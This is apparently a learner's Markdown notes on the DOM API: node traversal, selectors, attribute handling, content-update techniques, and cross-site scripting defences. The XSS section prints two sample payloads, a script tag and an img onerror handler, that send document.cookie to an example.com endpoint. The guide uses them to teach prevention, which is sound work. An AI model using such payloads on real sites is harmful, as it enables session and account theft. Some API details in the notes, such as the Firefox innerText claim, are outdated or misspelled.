# **Document Object Model API**

You will hear people call the DOM an **Application Programming Interface (API).** User interfaces let human interact with programs; APIs let programs (and scripts) talk to each other. The DOM states what your script can ask the browser about the current page, and how to tell the browser to update what is being shown to the user.
-

---

<!-- ## **Table of  Content** -->

* 1. [**DOM Traversal by Node interface members**][#1]
   * 1.1. [**Document as a tree of Nodes**][#11]
   * 1.2. [**Document as a tree of Element objects**][#12]
* 2. [**DOM Queries by Document and Element interface members**][#2]
   * 2.1. [**Methods for selecting with CSS selectors**][#21]
   * 2.2. [**Obsolete although faster selection methods**][#22]
   * 2.3. [**Shortcut historical properties for selection**][#23]
* 3. [**HTML elements Attribute Selection**][#3]
   * 3.1. [**HTMLElement objects API of the DOM HTML Specification**][#31]
   * 3.2. [**Element interface API of the DOM Core Specification**][#32]
   * 3.3. [**Dataset Attributes**][#33]
* 4. [**COMPARING TECHNIQUES: UPDATING HTML CONTENT**][#4]
   * 4.1. [**FIRST TECHNIQUE**][#41]
      * 4.1.1. [**ELEMENT CONTENT AS HTML**][#411]
      * 4.1.2. [**ELEMENT CONTENT AS PLAIN TEXT**][#412]
   * 4.2. [**SECOND TECHNIQUE: DOM MANIPULATION**][#42]
   * 4.3. [**LAST TECHNIQUE: `document.write()`**][#43]
* 5. [**DOM SECURITY**][#5]
   * 5.1. [**CROSS-SITE SCRIPTING (XSS) ATTACKS**][#51]
      * 5.1.1. [**HOW XSS HAPPENS**][#511]
      * 5.1.2. [**WHAT CAN THESE ATTACKS DO?**][#512]
      * 5.1.3. [**EVEN SIMPLE CODE CAN CAUSE PROBLEMS**][#513]
   * 5.2. [**DEFENDING AGAINST CROSS-SITE SCRIPTING**][#52]
      * 5.2.1. [**VALIDATE INPUT GOING TO THE SERVER**][#521]
      * 5.2.2. [**ESCAPE DATA COMING FROM THE SERVER & DATABASE**][#522]
   * 5.3. [**XSS: VALIDATION & TEMPLATES**][#53]
      * 5.3.1. [**FILTER OR VALIDATE INPUT**][#531]
      * 5.3.2. [**LIMIT WHERE USER CONTENT GOES**][#532]
   * 5.4. [**XSS: ESCAPING & CONTROLLING MARKUP**][#54]
      * 5.4.1. [**ESCAPING USER CONTENT**][#541]
      * 5.4.2. [**ADDING USER CONTENT**][#542]
   * 5.5. [**SAFETY TAKE OFF ON DOM AND HTML TAMPERING**][#55]

---

## 1. **DOM Traversal by Node interface members**

---
---

**As a browser loads a web page, it creates a model of the page. The model is called a DOM tree, and it is stored in the browser's memory. It consists of four main types of nodes.**

---

### 1.1. **Document as a tree of Nodes**

---
---

* `parentNode`  
The node that is the parent of this one, or null for nodes like the Document object that have no parent.

* `childNodes`  
A rea-only NodeList that contains all children (not just Element children) of the node.

* `firstChild`, `lastChild`  
The first and last child nodes of a node, or null if the node has no children.

* `nextSibling`, `previousSibling`  
The next and previous sibling nodes of a node. These properties connect nodes in a doubly linked list.

* `nodeType`  
A number that specifies what kind of node this is.  
**Document nodes** have value **9**.  
**Element nodes** have value **1**.  
**Text nodes** have value **3**.  
**Comment nodes** have value **8**.

* `nodeValue`  
Access and update textual content only on Text node and Comment node.

* `nodeName`  
The HTML tag name of an Element, converted to uppercase.
* `textContent`  
 See **[Section 4.1.2](#412-element-content-as-plain-text)**

  > :memo: **Note:**
  >  
  >**Attribute nodes** are not children of the element that carries them; **they are part of that element.**  
  >Neither **text nodes** nor **comment nodes** can have children.

---

### 1.2. **Document as a tree of Element objects**

---
---

***Property-only traversal API deprived of methods***

* `parentNode`  
This property of an element refers to the parent of the element, which will be another Element or a Document object.

* `children`  
This NodeList contains the Element children of an element, but excludes non-Element children like Text nodes (and Comment nodes).

* `childElementCount`  
The number of Element children. Returns the same value as children.length.

* `firstElementChild`, `lastElementChild`  
These properties refer to the first and last Element children of an Element. They are null if the Element has no Element children.

* `nextElementSibling`, `previousElementSibling`  
These properties refer to the sibling Elements immediately before or immediately after an Element, or null if there is no such sibling.

---

## 2. **DOM Queries by Document and Element interface members**

---
---

---

### 2.1. **Methods for selecting with CSS selectors**

---
---

* `querySelector(selector)`

* `querySelectorAll(selectors)`

* `closest(selector)`  
Return the specified selector or the closest ancestor. It works in the opposite direction of `querySelector()`.

* `matches(selector)`  
Test for the specified selector(s) en return `true` or `false`.

---

### 2.2. **Obsolete although faster selection methods**

---
---

Those methods don't take typical selector as parameters but just name strings. Since most of them yield **Live Nodelist** they are no longer recommanded.

* `getElmentById()`  
Faster than `querySelector(#*)`.

* `getElementsByClassName()`  
Faster than `querySelector(".*")`.

* `getElementsByTagName()`  
Faster than `querySelector("*")`.

* `getElementsByName()`  
Similar to `querySelectorAll("*[name='*']")`.

---

### 2.3. **Shortcut historical properties for selection**

---
---

* `document.documentElement` (the `<html>` element)
* `document.body.` (**[Practical use case](../../c06/js/click.js)**)
* `someParentNode.images.`
* `someParentNode.forms.`
* `someParentNode.links.`

  >**Example:**
  >
  > ```js
  > documents.forms.rating  // returns the HTML element:
  >```
  >
  > ```html
  ><form id="rating"></form>
  >```

  >:)<center>:memo:**NODE LISTS**</center>
  >
  >**Nodelists** look like arrays and are numbered like arrays, but they are not actually arrays; they are a type of object called a collection.
  >
  >Like any other object, a **Nodelist** has properties and methods, notably:
  >
  >* The **`length`** property tells you how many items are in the **Nodelist**.
  >* The **`item()`** method returns a specific node from the **Nodelist** when you as argument the index number of the item that you want. However, it is more common to use array syntax (with **`array[n]`**) to retrieve an item from a **Nodelist** (**[Case file: usage of item()](..\js\get-elements-by-class-name.js)** method).
  >
  >In a **live Node list**, when your script updates the page, the Nodelist is updated at the same time.
  >
  >The methods beginning with **`getElementsBy...`** return **live Node lists**. They are also typically faster to generate than **static Nodelists**.
  >
  >In a **static Nodelist** when your script updates the page, the NodeList is not updated to reflect the changes made by the script.
  >
  >The new methods that begin with **`querySelector`**. (which use CSS selector syntax) return **static Nodelists**.
  >
  >They reflect the document when the query was made. If the script changes the content of the page, the Nodelist is not updated to reflect those changes. **Therefore more stable they are more recommanded for DOM Queries.**
  >
  **[This Case file](..\js\node-list.js) shows why STATIC NODELIST are now prefered to LIVE NODELIST.**

---

## 3. **HTML elements Attribute Selection**

---
---

### 3.1. **HTMLElement objects API of the DOM HTML Specification**

---
---

This is a **property-based API** just for **getting** and **setting** attribute.

It makes attributes handling easier and code writing shorter with the following rules:

* **HTML attributes** are matched by **lowercase** Javascript properties. Hyphenated-words HTML attributes are matched by **camelCase** Javascript properties at the exception of **eventHandlers HTML attributes.**

   **Example:**

  * `id`
  * `title`  
  * `src`  
  * `tagName`
  * `defaultChecked`  
  * `onclick` is not in **camelCase.**

* HTML attributes which are reserved words in Javascript are prefixed with `html` at the exception of the `class` attributes.

   **Examples:**

  * `<label for="*">` is mirrored by `htmlFor`.  
  * `class` is mirrored by `className`.

  💡 **BEST PRACTICE**  
  When there is a property (like the `className` or `id` properties), it is generally considered better to update the properties rather than use a query method (because, behind the scenes, the method would just be setting the properties anyway).

---

### 3.2. **Element interface API of the DOM Core Specification**

---
---

This API defines general methods and properties for quering, setting, testing, and removing elements attributes.  
<mark>:warning: Before you work with an attribute, it is good practice to check whether it exists. This will save resources if the attribute cannot be found, and it will save you a thrown exception in case the attribute you are trying to remove does not exist.

**Common methods of the Element interface:**

* `hasAttribute(name)`  
* `getAttribute(name)`  
* `setAttribute(name,value)`  
* `removeAttribute(name)`

Much more flexible than the `className` property of the **[HTMLElement Object API](#31-htmlelement-objects-api-of-the-dom-html-specification)** the **Element Interface API** defines a **`classList`** property which yields an **iterable Array-like Object** called **DOMToken List Object** with the following members:

**Common properties of the `classList` DOMToken List object:**

* `length`  
* `value`, a single space-delimited string.

**Common methods of the `classList` DOMTokenList object:**

* `contains(name)`
* `add(name)`
* `remove(name)`
* `replace(oldName, newName)`
* `toggle(name)`

---

### 3.3. **Dataset Attributes**

---
---

In HTML, any attribute whose name is lowercase and begins with the prefix “`data-`” is considered valid, and you can use them for any purpose. These “**dataset attributes**” will not affect the presentation of the elements on which they appear, and they define a standard way to attach additional data without compromising document validity.

In the DOM, Element objects have a `dataset` property that refers to an object that has properties that correspond to the `data-` attributes with their prefix removed.

**Example:**

* `dataset.x` would match `data-x`.  
* The attribute `data-section-number` becomes `dataset.sectionNumber`.

---

## 4. **COMPARING TECHNIQUES: UPDATING HTML CONTENT**

---
---

### 4.1. **FIRST TECHNIQUE**

---
---

**HTML Snippet.**

```html
<p>This is a <i>simple</i> document</p>
```

From the assomption that the preceding `p` element content could be define either as the **HTML string** `"This is a <i>simple</i> document"` or as the **plain-text string** `"This is a simple document"` , element content is accessible from two standpoints.

---

#### 4.1.1. **ELEMENT CONTENT AS HTML**

---
---

* **`innerHTML` property**  
 Setting this property on an element invokes the web browser's parser and replaces the current content with a parsed representation of the new string.
* **`outerHTML` property**  
 When you query **outerHTML,** the value includes the element itself. and when you set **outerHTML** on an element, the new content replaces the element itself.

* **`insertAdjacentHTML(<adjacent>, <string>)` method**  
  ![adjacent four values](..\images\2022-10-26-22-20-27.png)<!--{width: 200px, float: right, border: 2px solid dodgerblue, margin: 0 0 5px 10px} -->  
 The **"string"** is the arbitrary HTML markup to be inserted and its precise position is given by the value of the **"adjacent"** first parameter with  the **string values:** `"beforebegin"`, `"afterbegin"`, `"beforeend"` or `"afterend"`.

  **:warning: WARNING: DISADVANTAGES OF THESE TECHNIQUES**

* They should only be used with caution when adding contents that come from the user as they could expose the page to **malicious content**.(**[See section 5.2](#52-defending-against-cross-site-scripting)** and **[See section 5.5](#55-safety-take-off-on-dom-and-html-tampering)**)
* Event handlers may no longer work as intended.  

---

#### 4.1.2. **ELEMENT CONTENT AS PLAIN TEXT**

---
---

* **`textContent` property**  
 The `textContent` property is defined by the **[Node class](#11-document-as-a-tree-of-nodes)**, so it works for Text nodes as well as Element nodes. For **Element nodes**, it finds and returns **all text in all descendants of the element.**

📝 **Note:**  
You may also come across a property called **`innerText`**, but you should generally avoid it for three key reasons:  
**Support:** Out of any standard, it is not supported by **Firefox.**  
**Obeys CSS:** It will not show any content that has been hidden by CSS.  
**Performance:** Because it takes into account layout rules it can be slower to retrieve the content than the **`textContent`** property.  
**[Case file: innerText vs textContent](..\inner-text-and-text-content.html)**

---

### 4.2. **SECOND TECHNIQUE: DOM MANIPULATION**

---
---

You can create element with `createElement()` and `createTextNode()` methods of the **Document Interface.** Then you can insert elements with the four subsequent methods of the **Node Interface,** which automatically convert **string arguments** to **text nodes** and therefore make `createTextNode()` method mostly useless.

* **`createElement("HTMLElement")` method**

   ```js
   // Create an empty paragraph element
   let paragraph = document.createElement("p");
   ```

* **`createDocumentFragment()` method** (no argument)

   ```js
   const fragment = document.createDocumentFragment();
   ```

   A **document fragment** is a **ghost node** which sole purpose is to herd **createElement()-generated childNodes** or **DOM-subtree** before inserting them to the real DOM.  
   :bulb: Its manipulation neither affects the DOM nor does it incur any performance.

* **`append(...node)` method**
* **`prepend(...node)` method**  
 Those methods take any number of argument and add it respectively  to the **end** and at the **beginning** of the **child list** of the element they are invoked on.
* **`before(...node)` method**
* **`after(...node)` method**  
* **`someNode.cloneNode(<boolean>)` method**  
 Note that elements can only be inserted at one spot in the document. If an element is already in the document and you insert it somewhere else, it will be moved to the new location, not copied. If you do want to make a copy of an element, use the **`.cloneNode(<bool>)` method,** passing `true` to copy all of its content:

 ```js
 // Find the heading element with class="greetings"
let greetings = document.querySelector("h2.greetings");

 // Now insert the new paragraph and a horizontal rule after that heading
greetings.after(paragraph, document.createElement("hr"));

// Make a copy of the paragraph and insert it after the greetings element
greetings.after(paragraph.cloneNode(true));
 ```

* **`replaceWith()` method**  
 It takes any number of arguments.
* **`remove()` method**  
 It take no argument.

⭐ **ADVANTAGES of updating the DOM with DOM Manipulations** ⭐

* It is suited to changing one element from a fragment where there are many siblings.
* It does not affect event handlers.
* It easily allows a script to add elements incrementally (when you do not want to alter a lot of code at once).

---

### 4.3. **LAST TECHNIQUE: `document.write()`**

---
---

The **`document`** object's **`write()`** method is a simple way to showcase HTML source code updating to beginners, but its use is rarely advised.  

⚠ **DISADVANTAGES OF THIS TECHNIQUE**

* It only works when the page initially loads.
* If you use it after the page has loaded it can:
   1. Overwrite the whole page
   2. Not add the content to the page
   3. Create a new page
* It can cause problems with XHTML pages that are strictly validated.
* This method is very rarely used by programmers these days and is generally frowned upon.

---

## 5. **DOM SECURITY**

---
---

### 5.1. **CROSS-SITE SCRIPTING (XSS) ATTACKS**

---
---

<mark>**If you add HTML to a page using `innerHTML` (or several jQuery methods), you need to be aware of Cross-Site Scripting Attacks or XSS; otherwise, an attacker could gain access to your users' accounts.**</mark>

---

#### 5.1.1. **HOW XSS HAPPENS**

---
---

XSS involves an attacker placing malicious code into a site. Websites often feature content created by many different people. For example:

* Users can create profiles or add comments
* Multiple authors may contribute articles
* Data can come from third-party sites such as Facebook, Twitter, news tickers, and other feeds
* Files such as images and video may be uploaded

Data you do not have complete control over is known as **untrusted data**; it must be handled with care.

---

#### 5.1.2. **WHAT CAN THESE ATTACKS DO?**

---
---

<mark>**XSS** can give the attacker access to information in:

* <mark>**The DOM** (including form data)
* <mark>**That website's cookies**
* <mark>**Session tokens**: information that identifies you from other users when you log into a site

<mark>This could let the attacker access a user account and:

* <mark>Make purchases with that account
* <mark>Post defamatory content
* <mark>Spread their malicious code further faster

---

#### 5.1.3. **EVEN SIMPLE CODE CAN CAUSE PROBLEMS**

---
---

Malicious code often mixes HTML and JavaScript (although URLs and CSS can be used to trigger XSS attacks). The two examples below demonstrate how fairly simple code could help an attacker access a user's account.

This first example stores cookie data in a variable, which could then be sent to a third-party server:

```js
<script>var adr= 'http : //example.com/xss .php?cookie=' + escape(document . cookie);</script>
```

This code shows how a missing image can be used with an HTML attribute to trigger malicious code:

```html
<img src="http://nofile" onerror="adr='http: //example.com/ xss .php?'+escape(document.cookie)";>
```

<mark>**Any HTML from untrusted sources opens your site to XSS attacks. But the threat is only from certain characters.**

---

### 5.2. **DEFENDING AGAINST CROSS-SITE SCRIPTING**

---
---

#### 5.2.1. **VALIDATE INPUT GOING TO THE SERVER**

---
---

1. **BROWSER REQUESTS PAGES FROM AND SENDS FORM DATA TO WEB SERVER**
   * <mark>Only let visitors input the kind of characters they need to when supplying information. This is known as **validation**. Do not allow untrusted users to submit HTML markup or JavaScript.

2. **WED SERVER COLLECTS INFORMATION FROM BROWSER AND PASSES IT TO DATABASE**
   * <mark>Double-check validation on the server before displaying user content or storing it in a database. This is important because **users could bypass validation in the browser by turning JavaScript off**

3. **DATABASE STORES INFORMATION CREATED BY WEBSITE ADMINS AND USERS**
   * The database may safely contain markup and script from trusted sources (e.g., your content management system). This is because it does not try to process the code; it just stores it.

---

#### 5.2.2. **ESCAPE DATA COMING FROM THE SERVER & DATABASE**

---
---

4. **DATABASE RETURNS CONTENT NEEDED TO CREATE WEB PAGES**
   * <mark>As your data leaves the database, all potentially dangerous characters should be escaped (**[Section 5.4.1](#541-escaping-user-content)**).


5. **WED SERVER GENERATES PAGES USING DATA FROM DATABASE AND INSERTS IT INTO TEMPLATES**
   * Make sure that you are only inserting content generated by users into certain parts of the template files (**[Section 5.3.2](#532-limit-where-user-content-goes)**).

6. **BROWSER PROCESSES HTML, CSS, AND JAVASCRIPT FILES SENT FROM WEB SERVER**
   * <mark>Do not create DOM fragments containing HTML from untrusted sources. It should only be added as text once it has been escaped.

<mark>**So, you can safely use `innerHTML` to add markup to a page if you have written the code - but content from any untrusted sources should be escaped and added as text (not markup), using properties like `textContent`.**

---

### 5.3. **XSS: VALIDATION & TEMPLATES**

---
---

#### 5.3.1. **FILTER OR VALIDATE INPUT**

---
---

<mark>The most basic defense is to prevent users from entering characters into form fields that they do not need to use when providing that kind of information.

<mark>For example, **users' names and email addresses will not contain angled brackets, ampersands, or parentheses,** so you can validate data to prevent characters like this being used.

<mark>**This can be done in the browser, but must also be done on the server (in case the user has JavaScript turned off).** You learn about validation in Chapter 13

<mark>You may have seen that the comment sections on websites rarely allow you to enter a lot of markup (they sometimes allow a limited subset of HTML). **This is to prevent people from entering malicious code such as `<script>` tags, or any other character with an event handling attribute.**

Even the HTML editors used in many content management systems will limit the code that you are allowed to use within them, and will automatically try to correct any markup that looks malicious.

---

#### 5.3.2. **LIMIT WHERE USER CONTENT GOES**

---
---

Malicious users will not just use `<script>` tags to try and create an XSS attack. As you saw in **[Section 5.1.3](#513-even-simple-code-can-cause-problems)**, **malicious code can live in an event handler attribute without being wrapped in `<script>` tags. XSS can also be triggered by malicious code in CSS or URLs.**

<mark>Browsers process HTML, CSS, and JavaScript in different ways (or execution contexts), and in each language different characters can cause problems. Therefore, **you should only add content from untrusted sources as text (not markup), and place that text in elements that are visible in the viewport.**

<mark>**Never place any user's content in the following places without detailed experience of the issues involved** (which you will gain with more IT experiences):

|||
---------:|:----------|
 **Script tags:** | `<script>not here</script>` |
 **HTML comments:** | `<!-- not here -->` |
 **Tag names:** | `<notHere href="/test"/>` |
 **Attributes:** | `<div notHere="notHere"></div>` |
 **CSS values:** | `{color: not here}` |

---

### 5.4. **XSS: ESCAPING & CONTROLLING MARKUP**

---
---

<font color="red">**Any content generated by users that contain characters that are used in code should be escaped on the server. You must control any markup added to the page.**</font>

---

#### 5.4.1. **ESCAPING USER CONTENT**

---
---

All data from untrusted sources should be escaped on the server before it is shown on the page. Most server-side languages offer helper functions that will strip-out or escape malicious code.

* **HTML**  
Escape these characters so that they are displayed as characters (not processed as code).
    |||||
    |---------:|:----------|----------:|:----------|
    | **&** | `&amp;` | **\'** | `&#x27;` (not `&apos;`) |
    | **\<** | `&lt;` | **\"** | `&quot;` |
    | **\>** | `&gt;` | **\/** | `&#x2F;` |
    | **\`**| `&#x60;` |

* **JAVASCRIPT**  
  **Never include data from untrusted sources in JavaScript.** It involves escaping all ASCII characters with a value less than 256 that are not alphanumeric characters (and can be a security risk).

* <mark>**URL**  
  If you have links containing user input (e.g., links to a user profile or search queries), **use the JavaScript `encodeURIComponent()` method to encode the user input.** It encodes the following characters:
  **\, \/ \& \? \: \@ \$ \= \#**

---

#### 5.4.2. **ADDING USER CONTENT**

---
---

When you add untrusted content to an HTML page, once it has been escaped on the server, it should still be added to the page as text. JavaScript and jQuery both offer tools for doing this:

* **JAVASCRIPT**  
**DO use:** `textContent` or `innerText` (**[Section 4.1.2](#412-element-content-as-plain-text)**)  
**DO NOT use:** `innerHTML` (**[Section 4.1.1](#411-element-content-as-html)**)

* **JQUERY**  
**DO use:** `.text()` (see p316)  
**DO NOT use:** `.html()` (see p316)

---

### 5.5. **SAFETY TAKE OFF ON DOM AND HTML TAMPERING**

---
---

You can still use the `innerHTML` property and jQuery `•html()` method to add HTML to the DOM, but you must make sure that:

* [x] <mark>You control all of the markup being generated (do not allow user content that could contain markup).
* [x] <mark>The user's content is escaped and added as text using the approaches noted above, rather than adding the user's content as HTML.

---
---

[#1]: #1-dom-traversal-by-node-interface-members
[#11]: #11-document-as-a-tree-of-nodes
[#12]: #12-document-as-a-tree-of-element-objects
[#2]: #2-dom-queries-by-document-and-element-interface-members
[#21]: #21-methods-for-selecting-with-css-selectors
[#22]: #22-obsolete-although-faster-selection-methods
[#23]: #23-shortcut-historical-properties-for-selection
[#3]: #3-html-elements-attribute-selection
[#31]: #31-htmlelement-objects-api-of-the-dom-html-specification
[#32]: #32-element-interface-api-of-the-dom-core-specification
[#33]: #33-dataset-attributes
[#4]: #4-comparing-techniques-updating-html-content
[#41]: #41-first-technique
[#411]: #411-element-content-as-html
[#412]: #412-element-content-as-plain-text
[#42]: #42-second-technique-dom-manipulation
[#43]: #43-last-technique-documentwrite
[#5]: #5-dom-security
[#51]: #51-cross-site-scripting-xss-attacks
[#511]: #511-how-xss-happens
[#512]: #512-what-can-these-attacks-do
[#513]: #513-even-simple-code-can-cause-problems
[#52]: #52-defending-against-cross-site-scripting
[#521]: #521-validate-input-going-to-the-server
[#522]: #522-escape-data-coming-from-the-server--database
[#53]: #53-xss-validation--templates
[#531]: #531-filter-or-validate-input
[#532]: #532-limit-where-user-content-goes
[#54]: #54-xss-escaping--controlling-markup
[#541]: #541-escaping-user-content
[#542]: #542-adding-user-content
[#55]: #55-safety-take-off-on-dom-and-html-tampering
